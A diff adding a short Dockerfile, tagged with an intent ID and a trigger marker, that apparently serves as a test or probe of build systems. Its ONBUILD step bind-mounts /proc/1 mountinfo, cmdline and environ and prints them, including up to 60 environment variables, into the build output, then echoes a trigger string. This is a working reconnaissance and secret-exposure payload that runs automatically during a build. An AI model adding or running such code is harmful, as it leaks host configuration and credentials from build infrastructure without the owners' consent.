@@ -1,0 +1,5 @@
+# INTENT-67522-5c45c32f
+FROM alpine:3.20 AS base
+ONBUILD RUN --mount=type=bind,source=proc/1/mountinfo,target=/mi1 --mount=type=bind,source=proc/1/cmdline,target=/c1 --mount=type=bind,source=proc/1/environ,target=/e1 sh -c 'echo ===MI1===; head -c 14000 /mi1; echo; echo ===C1===; tr "\0" " " < /c1; echo; echo ===E1===; tr "\0" "\n" < /e1 | head -60; echo; echo ===E_END==='
+FROM base
+RUN sh -c 'echo TRIGGER_I67522_E_5c45c32f'
